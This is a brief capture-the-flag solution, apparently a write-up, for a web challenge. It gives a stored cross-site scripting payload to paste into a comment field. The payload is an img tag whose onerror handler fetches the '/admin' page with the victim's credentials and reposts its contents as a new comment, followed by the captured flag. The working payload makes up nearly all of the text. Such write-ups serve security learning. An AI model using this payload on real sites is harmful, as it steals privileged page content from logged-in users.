Enter t in the name and the following in the comment. When you update the page, the flag

```html
<img
  src="x"
  onerror="
    (async () => {
      const res = await fetch('/admin', { credentials: 'include' });
      const text = await res.text();
      await fetch('/new-comment', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'name=t&comment=' + encodeURIComponent(text)
      });
    })();
  "
/>
```

`punk_{DFAMPF8TV5HQ7RC5}`
